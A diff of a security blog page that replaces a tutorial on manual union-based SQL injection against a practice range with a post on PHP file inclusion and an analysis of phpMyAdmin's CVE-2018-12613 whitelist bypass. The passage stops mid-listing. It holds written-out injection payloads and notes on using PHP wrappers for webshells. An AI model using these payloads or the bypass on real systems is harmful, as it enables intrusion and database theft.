@@ -22,34 +22,35 @@
     var CONFIG = {"hostname":"cpelurker.github.io","root":"/blog/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="&amp;emsp;以一个基础入门靶场为例，记录一下简单的一阶SQL手注操作以及针对MYSQL5以上版本的数据库信息语句构造。">
+  <meta name="description" content="在包含文件时候，为了灵活包含文件，将被包含文件设置为变量，用来动态调用。但通过动态变量的方式引入需要包含的文件时，用户对变量的值可控而服务器端又未对变量值进行合理地校验或者校验被绕过，因此导致了文件包含漏洞。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="SQL注入 MySql5以上常规注入笔记">
+<meta property="og:title" content="文件包含漏洞（一）">
 <meta property="og:url" content="https://cpelurker.github.io/posts/10a6c5c8.html">
 <meta property="og:site_name" content="Lkio&#39;s Blog">
-<meta property="og:description" content="&amp;emsp;以一个基础入门靶场为例，记录一下简单的一阶SQL手注操作以及针对MYSQL5以上版本的数据库信息语句构造。">
+<meta property="og:description" content="在包含文件时候，为了灵活包含文件，将被包含文件设置为变量，用来动态调用。但通过动态变量的方式引入需要包含的文件时，用户对变量的值可控而服务器端又未对变量值进行合理地校验或者校验被绕过，因此导致了文件包含漏洞。">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210128220929969.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzE5MTEwOA==,size_16,color_FFFFFF,t_70#pic_center">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/2021012822095058.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzE5MTEwOA==,size_16,color_FFFFFF,t_70#pic_center">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210128220809101.png#pic_center">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210128220908485.png#pic_center">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210128221011488.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzE5MTEwOA==,size_16,color_FFFFFF,t_70#pic_center">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/2021012822103940.png#pic_center">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210128221105970.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzE5MTEwOA==,size_16,color_FFFFFF,t_70#pic_center">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210128221126966.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzE5MTEwOA==,size_16,color_FFFFFF,t_70#pic_center">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210128221141140.png#pic_center">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210128221200950.png#pic_center">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210128221221239.png#pic_center">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210128221234908.png#pic_center">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210128221306769.png#pic_center">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210128221326429.png#pic_center">
-<meta property="article:published_time" content="2020-06-12T13:01:10.000Z">
-<meta property="article:modified_time" content="2021-01-28T14:22:48.537Z">
+<meta property="og:image" content="https://s3.ax1x.com/2021/01/27/szLUne.png">
+<meta property="og:image" content="https://s3.ax1x.com/2021/01/27/szOp36.png">
+<meta property="og:image" content="https://s3.ax1x.com/2021/01/27/szLjE9.png">
+<meta property="og:image" content="https://cpelurker.github.io/blog/posts/10a6c5c8.htm/image-20210127121036800.png">
+<meta property="og:image" content="https://s3.ax1x.com/2021/01/27/szLx41.png">
+<meta property="og:image" content="https://s3.ax1x.com/2021/01/27/szO9gK.png">
+<meta property="og:image" content="https://s3.ax1x.com/2021/01/27/szOS9x.png">
+<meta property="og:image" content="https://s3.ax1x.com/2021/01/27/szXKiR.png">
+<meta property="og:image" content="https://s3.ax1x.com/2021/01/27/szX8sO.png">
+<meta property="og:image" content="https://s3.ax1x.com/2021/01/27/szXtdH.png">
+<meta property="og:image" content="https://s3.ax1x.com/2021/01/27/szXNod.png">
+<meta property="og:image" content="https://s3.ax1x.com/2021/01/27/szXdJI.png">
+<meta property="og:image" content="https://s3.ax1x.com/2021/01/27/szXaFA.png">
+<meta property="article:published_time" content="2020-08-27T07:04:52.000Z">
+<meta property="article:modified_time" content="2021-01-31T13:26:41.066Z">
 <meta property="article:author" content="Lkio">
 <meta property="article:tag" content="Web">
-<meta property="article:tag" content="MySql">
+<meta property="article:tag" content="PhpMyadmin">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="CVE">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20210128220929969.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzE5MTEwOA==,size_16,color_FFFFFF,t_70#pic_center">
+<meta name="twitter:image" content="https://s3.ax1x.com/2021/01/27/szLUne.png">
 
 <link rel="canonical" href="https://cpelurker.github.io/posts/10a6c5c8.html">
 
@@ -64,7 +65,7 @@
   };
 </script>
 
-  <title>SQL注入 MySql5以上常规注入笔记 | Lkio's Blog</title>
+  <title>文件包含漏洞（一） | Lkio's Blog</title>
   
 
 
@@ -223,7 +224,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          SQL注入 MySql5以上常规注入笔记
+          文件包含漏洞（一）
         </h1>
 
         <div class="post-meta">
@@ -233,14 +234,14 @@
               </span>
               <span class="post-meta-item-text">发表于</span>
 
-              <time title="创建时间：2020-06-12 21:01:10" itemprop="dateCreated datePublished" datetime="2020-06-12T21:01:10+08:00">2020-06-12</time>
+              <time title="创建时间：2020-08-27 15:04:52" itemprop="dateCreated datePublished" datetime="2020-08-27T15:04:52+08:00">2020-08-27</time>
             </span>
               <span class="post-meta-item">
                 <span class="post-meta-item-icon">
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-01-28 22:22:48" itemprop="dateModified" datetime="2021-01-28T22:22:48+08:00">2021-01-28</time>
+                <time title="修改时间：2021-01-31 21:26:41" itemprop="dateModified" datetime="2021-01-31T21:26:41+08:00">2021-01-31</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -257,13 +258,13 @@
               <span class="post-meta-item-icon">
                 <i class="far fa-file-word"></i>
               </span>
-              <span>2.5k</span>
+              <span>6.7k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
-              <span>5 分钟</span>
+              <span>12 分钟</span>
             </span>
 
         </div>
@@ -275,110 +276,132 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p>&emsp;以一个基础入门<a target="_blank" rel="noopener" href="https://hack.zkaq.cn/battle/target?id=485e58d0afa7e4f7">靶场</a>为例，记录一下简单的一阶SQL手注操作以及针对MYSQL5以上版本的数据库信息语句构造。</p>
+        <blockquote>
+<p>在包含文件时候，为了灵活包含文件，将被包含文件设置为变量，用来动态调用。但通过动态变量的方式引入需要包含的文件时，用户对变量的值可控而服务器端又未对变量值进行合理地校验或者校验被绕过，因此导致了文件包含漏洞。</p>
+</blockquote>
 <a id="more"></a>
 
-<h1 id="0x01-注入点"><a href="#0x01-注入点" class="headerlink" title="0x01 注入点"></a>0x01 注入点</h1><p>因为这是一个简单的入门手注靶场，就不做过多详述。</p>
-<p>一般的，先针对目标URL，观察下是数字型还是字符型注入。</p>
-<blockquote>
-<p><a target="_blank" rel="noopener" href="http://59.63.200.79:8003/?id=1">http://59.63.200.79:8003/?id=1</a></p>
-</blockquote>
-<p>很容易发现，这应该是一个数字型注入点。</p>
-<p>构造payload，观察页面回显是否正常。</p>
-<p>?id=1 and 1=2</p>
-<p><img src="../images/bili.gif" data-original="https://img-blog.csdnimg.cn/20210128220929969.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzE5MTEwOA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p>发现的确符合预期的false逻辑执行，页面并没有能够正常回显。</p>
-<h1 id="0x02-判断字段数"><a href="#0x02-判断字段数" class="headerlink" title="0x02 判断字段数"></a>0x02 判断字段数</h1><p>构造payload</p>
-<p>?id=1 order by 1</p>
-<p>?id=1 order by 2</p>
-<p>?id=1 order by 3</p>
-<p><img src="../images/bili.gif" data-original="https://img-blog.csdnimg.cn/2021012822095058.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzE5MTEwOA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p>此时页面回显异常，说明当前表中有2个字段，即两列数据。进一步我们考虑利用union联合查询合并查询结果，替换成我们想要的信息，再次之前需要确认一下回显点。</p>
-<p>构造payload</p>
-<p>?id=1 and 1=2 union select 1,2#</p>
-<p>因为这里union联合查询会合并两句select语句结果，我们需要让第一句查询逻辑出错。</p>
-<p><img src="../images/bili.gif" data-original="https://img-blog.csdnimg.cn/20210128220809101.png#pic_center" alt="在这里插入图片描述"></p>
-<p>通过图片可以确定回显点。</p>
-<h1 id="0x03-收集信息"><a href="#0x03-收集信息" class="headerlink" title="0x03 收集信息"></a>0x03 收集信息</h1><p>这边我们仅关注当前数据库信息。</p>
-<p>构造payload</p>
-<p>?id=1 and 1=2 union select 1,version()#</p>
-<p><img src="../images/bili.gif" data-original="https://img-blog.csdnimg.cn/20210128220908485.png#pic_center" alt="在这里插入图片描述"></p>
-<p>可以看到是Mysql的5.5.53版本。</p>
-<h1 id="0X04-查询相关信息"><a href="#0X04-查询相关信息" class="headerlink" title="0X04 查询相关信息"></a>0X04 查询相关信息</h1><p>在5以上的MySQL有一个名为information_schema的内置库。 这是保存有关DB服务器中存在的表和列的信息。 也就是说，它包含站点的所有表和列的名称。</p>
-<p>因此我们可以分别构造payload如下来暴库、猜表、猜字段等</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 爆库</span><br><span class="line">select 1,2,3,...,SCHEMA_NAME from information_schema.SCHEMATA	</span><br><span class="line"># 猜表</span><br><span class="line">select 1,2,3,...,TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA&#x3D;&#39;目标库名&#39;</span><br><span class="line"># 猜字段	</span><br><span class="line">select 1,2,3,...,COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME&#x3D;&#39;目标表名&#39;</span><br></pre></td></tr></table></figure>
-<p>在此基础上，我们根据测试出的注入点、字段数、回显位置构造URL。</p>
-<p><strong>爆库</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1 and 1&#x3D;2 union select 1,SCHEMA_NAME from information_schema.SCHEMATA limit 0,1</span><br></pre></td></tr></table></figure>
-<p><img src="../images/bili.gif" data-original="https://img-blog.csdnimg.cn/20210128221011488.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzE5MTEwOA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p>因为这里只能显示一处信息，逐次改变limit位置显然很麻烦。</p>
-<p>我们可以采用字符串拼接的方法，一次性爆出。</p>
-<p>构造payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1 and 1&#x3D;2 union select 1,group_concat(schema_name) from information_schema.SCHEMATA#</span><br></pre></td></tr></table></figure>
-
-
-<p><img src="../images/bili.gif" data-original="https://img-blog.csdnimg.cn/2021012822103940.png#pic_center" alt="在这里插入图片描述"></p>
-<p><strong>爆表</strong></p>
-<p>我们分别爆出maoshe、test两个库中的数据表。</p>
-<p>构造payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA&#x3D;&#39;maoshe&#39;</span><br></pre></td></tr></table></figure>
-<p><img src="../images/bili.gif" data-original="https://img-blog.csdnimg.cn/20210128221105970.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzE5MTEwOA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p>可以看见maoshe库中有admin、dirs、news和xss四张表。</p>
-<p>继续构造payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA&#x3D;&#39;test&#39;</span><br></pre></td></tr></table></figure>
-<p><img src="../images/bili.gif" data-original="https://img-blog.csdnimg.cn/20210128221126966.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzE5MTEwOA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p>这是一个空库。</p>
-<p><strong>爆字段</strong></p>
+<h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>&emsp;程序开发人员一般会把重复使用的函数写到单个文件中,需要使用某个函数时直接调用此文件，而无需再次编写，这种调用文件的过程一般被称为文件包含。通过函数包含文件时，由于没有对包含的文件名进行有效的过滤处理，被攻击者利用从而导致了包含了Web根目录以外的文件进来,就会导致文件信息的泄露甚至注入了恶意代码。</p>
+<h2 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h2><p>PHP中常见的包含文件函数</p>
 <ul>
-<li><p>admin表</p>
-<p>构造payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1 and 1&#x3D;2 union select 1,GROUP_CONCAT(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME&#x3D;&#39;admin&#39; limit 0,1#</span><br></pre></td></tr></table></figure>
-
-
+<li><p>include()</p>
+<p>使用该函数包含文件时，只有代码执行到 include()函数时才将文件包含<br>进来，发生错误时之给出一个警告，继续向下执行。</p>
+</li>
+<li><p>include_one()</p>
+<p>功能与Include()相同，区别在于当重复调用同一文件时，程序只调用一次</p>
+</li>
+<li><p>require()</p>
+<p>require()与include()的区别在于require()执行如果发生错误，函数会输出<br>错误信息，并终止脚本的运行。</p>
+</li>
+<li><p>require_once()</p>
+<p>与require()相同，区别在于当重复调用同一文件时，程序只调用一次。</p>
 </li>
 </ul>
-<p><img src="../images/bili.gif" data-original="https://img-blog.csdnimg.cn/20210128221141140.png#pic_center" alt="在这里插入图片描述"></p>
+<h2 id="危险配置"><a href="#危险配置" class="headerlink" title="危险配置"></a>危险配置</h2><p><strong>RFI</strong> 远程文件包含相关配置</p>
+<p>allow_url_fopen</p>
+<p>allow_url_include</p>
+<h2 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h2><p>在PHP中</p>
 <ul>
-<li><p>dirs表</p>
-<p>构造payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1 and 1&#x3D;2 union select 1,GROUP_CONCAT(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME&#x3D;&#39;dirs&#39; limit 0,1#</span><br></pre></td></tr></table></figure>
-
-
+<li><p><code>php://input</code></p>
+<p>获取post数据，可以用来写木马</p>
+</li>
+<li><p><code>php://filter</code></p>
+<p>经常利用它进行base64编码，读取源代码</p>
+</li>
+<li><p><code>file://</code></p>
+<p>访问本地文件系统，必须用绝对路径</p>
+</li>
+<li><p><code>data://</code></p>
+<p>传输数据</p>
+</li>
+<li><p><code>phar://</code></p>
+<p>解压缩</p>
 </li>
 </ul>
-<p><img src="../images/bili.gif" data-original="https://img-blog.csdnimg.cn/20210128221200950.png#pic_center" alt="在这里插入图片描述"></p>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/szLUne"><img src="../images/bili.gif" data-original="https://s3.ax1x.com/2021/01/27/szLUne.png" alt="szLUne.png"></a></p>
+<p>（图片来自<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Lee-404/p/12821986.html%EF%BC%89">https://www.cnblogs.com/Lee-404/p/12821986.html）</a></p>
+<h1 id="CVE-2018-12613-复现分析"><a href="#CVE-2018-12613-复现分析" class="headerlink" title="CVE-2018-12613 复现分析"></a>CVE-2018-12613 复现分析</h1><p>&emsp;phpMyAdmin是一套开源的、基于Web的MySQL数据库管理工具。在phpmyadmin 4.8.1 版本，index.php中存在一处文件包含逻辑，通过二次编码即可绕过检查，造成远程文件包含漏洞。</p>
+<h2 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h2><p>漏洞入口如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>])</span><br><span class="line">    &amp;&amp; is_string(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>])</span><br><span class="line">    &amp;&amp; ! preg_match(<span class="string">&#x27;/^index/&#x27;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>])</span><br><span class="line">    &amp;&amp; ! in_array(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>], <span class="variable">$target_blacklist</span>)</span><br><span class="line">    &amp;&amp; Core::checkPageValidity(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>])</span><br><span class="line">) &#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>];</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里有个文件包含，需要满足如下五个条件：</p>
 <ul>
-<li><p>news表</p>
-<p>构造payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1 and 1&#x3D;2 union select 1,GROUP_CONCAT(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME&#x3D;&#39;news&#39; limit 0,1#</span><br></pre></td></tr></table></figure>
-
-
+<li><p>$_REQUEST[‘target’] </p>
+<p><strong>$_REQUEST</strong>是PHP中的超级全局变量，接收表单提交的数据，所以这边首先要满足存在target参数</p>
+</li>
+<li><p>is_string($_REQUEST[‘target’])</p>
+<p><strong>is_string()</strong> 函数用于检测变量是否是字符串。如果指定变量为字符串，则返回 TRUE，否则返回 FALSE。所以target参数需要是一个字符串。</p>
+</li>
+<li><p>! preg_match(‘/^index/‘, $_REQUEST[‘target’])</p>
+<p>**preg_match()**用于执行正则匹配，返回匹配次数，又因为是非贪婪的匹配，所以返回值是0或1。</p>
+<p>搜索target参数中与模式相匹配字符串，并取非，即不能出现index</p>
+</li>
+<li><p>! in_array($_REQUEST[‘target’], $target_blacklist)</p>
+<p><strong>in_array()</strong> 函数搜索数组中是否存在指定的值。</p>
+<p>target对应的字符串不能出现在 $target_blacklist中</p>
+</li>
+<li><p>Core::checkPageValidity($_REQUEST[‘target’]</p>
+<p>需要满足Core类的checkPageValidity方法判断</p>
 </li>
 </ul>
-<p><img src="../images/bili.gif" data-original="https://img-blog.csdnimg.cn/20210128221221239.png#pic_center" alt="在这里插入图片描述"></p>
-<ul>
-<li><p>xss表</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1 and 1&#x3D;2 union select 1,GROUP_CONCAT(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME&#x3D;&#39;xss&#39; limit 0,1#</span><br></pre></td></tr></table></figure>
+<p>前三个条件，很清晰，要求能接收到表单提交的target参数对应的数据，并且该数据是一个不包含”index”字符串的字符串。对于第四点和第五点，我们需要进一步去查看$target_blacklist和checkPageValidity方法到底是什么。</p>
+<p>首先来看一下$target_blacklist这个变量，对应index.php的第50～52行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$target_blacklist</span> = <span class="keyword">array</span> (</span><br><span class="line">    <span class="string">&#x27;import.php&#x27;</span>, <span class="string">&#x27;export.php&#x27;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+<p>不难看出，这里创建了一个索引数组，也就说target不能是import.php或export.php。</p>
+<p>继续来看checkPageValidity方法，在libraries/classes/Core.php文件中的443～476行。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkPageValidity</span>(<span class="params">&amp;<span class="variable">$page</span>, <span class="keyword">array</span> <span class="variable">$whitelist</span> = []</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">        <span class="variable">$whitelist</span> = <span class="built_in">self</span>::<span class="variable">$goto_whitelist</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !is_string(<span class="variable">$page</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (in_array(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">        <span class="variable">$page</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>);</span><br><span class="line">    <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">        <span class="variable">$_page</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        mb_strpos(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>此处只传了一个参数$_REQUEST[‘target’]，我们可以先定位第一个if判断，在$whitelist为空的条件下，会引用静态声明的$goto_whitelist。默认的白名单如下所示</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$goto_whitelist</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;db_datadict.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;db_sql.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;db_events.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;db_export.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;db_importdocsql.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;db_multi_table_query.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;db_structure.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;db_import.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;db_operations.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;db_search.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;db_routines.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;export.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;import.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;index.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;pdf_pages.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;pdf_schema.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;server_binlog.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;server_collations.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;server_databases.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;server_engines.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;server_export.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;server_import.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;server_privileges.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;server_sql.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;server_status.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;server_status_advisor.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;server_status_monitor.php&#x27;</span>,</span><br><span class="line">    <span 